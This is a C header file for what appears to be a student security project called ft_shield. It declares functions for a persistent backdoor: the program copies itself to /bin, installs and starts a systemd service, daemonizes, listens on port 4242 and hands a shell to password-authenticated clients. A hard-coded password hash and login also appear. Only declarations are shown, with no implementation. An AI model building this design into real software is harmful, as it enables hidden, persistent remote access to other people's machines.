#ifndef FT_SHIELD_H
#define FT_SHIELD_H

#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <poll.h>
#include <stdbool.h>
#include <time.h>


#define PORT 4242
#define BUFFER_SIZE 1024
#define MAX_CLIENTS 3
#define AUTH_PASSWORD_HASH "007f3592"
#define SECRET_KEY 54
#define SOURCE_FILE "ft_shield"
#define DEST_FILE "/bin/ft_shield"
#define SERVICE_NAME "ft_shield.service"
#define LOGIN "yismaili"
#define LOGS "/var/log/ft_shield.log"

typedef struct {
    int _socket_fd;
    int _new_socket_fd;
    int _port_number;
    char *_password;
    struct sockaddr_in _serv_addr, _cli_addr;
    struct pollfd _fds[MAX_CLIENTS];
} Server;

typedef struct {
    bool isAuthenticated;
    int socket_fd;
} Client;


void quine();

void copy_binary_f(const char *sourcePath, const char *destinationPath);
void enable_and_start_s(const char* service_name);
void create_service(const char* service_name, const char* binary_path);

void create_daemon();

void hash(char *password, char *hash);
void add_client(Client* client_arr, int socket_fd);
void remove_client(Client* client_arr, int socket_fd);
int is_autheticated(Client* client_arr, int socket_fd);
void make_autheticated(Client* client_arr, int socket_fd);
int authenticate(int client_socket, Client* client_arr, int *numfds);

void launch_shell(int client_sock, Client* client_arr, int *numfds);

void close_socket(int socket_fd);
void read_write_socket(Client* client_arr,  int sock, int *numfds);
void accept_socket(Server *server);
void listen_socket(Server *server);
void bind_socket(Server *server);
void create_socket(Server *server);
void init_server(Server *server, int port_number, const char *password);
void log_user_action(const char *command);
void server();

#endif